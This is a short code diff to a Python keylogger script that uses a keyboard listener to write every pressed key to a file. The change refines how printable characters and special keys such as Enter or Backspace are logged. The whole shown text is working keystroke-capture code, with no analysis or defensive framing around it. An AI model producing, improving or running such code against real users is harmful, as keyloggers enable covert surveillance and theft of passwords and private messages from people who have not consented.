@@ -14,10 +14,10 @@ def write_to_file(key):
             file.write(" ")  
         elif key == "Key.enter":
             file.write("\n")
-        elif key == "Key.backspace":
-            file.write("[BACKSPACE]") 
-        else:
+        elif len(key) == 1:
             file.write(key)
+        else:
+            file.write("[" + key[4:].upper() + "]")
             
 with Listener(on_press=write_to_file) as listener:
     listener.join()
